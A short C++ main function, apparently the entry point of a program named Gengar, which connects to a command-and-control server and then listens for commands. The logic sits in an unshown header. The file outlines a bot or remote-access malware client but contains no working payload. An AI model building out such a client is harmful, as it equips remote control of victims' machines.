#include <iostream>
#include "gengar.h"

int main()
{
	Gengar gengar;
	gengar.ConnectToCnc();
	gengar.ListenForCommand();
}
